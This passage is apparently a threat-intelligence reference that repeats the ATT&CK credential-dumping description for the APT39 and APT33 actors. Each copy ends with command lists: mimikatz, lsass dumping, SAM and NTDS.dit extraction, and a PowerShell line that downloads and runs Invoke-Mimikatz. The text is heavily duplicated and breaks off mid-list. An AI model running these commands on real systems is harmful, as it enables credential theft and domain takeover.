Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
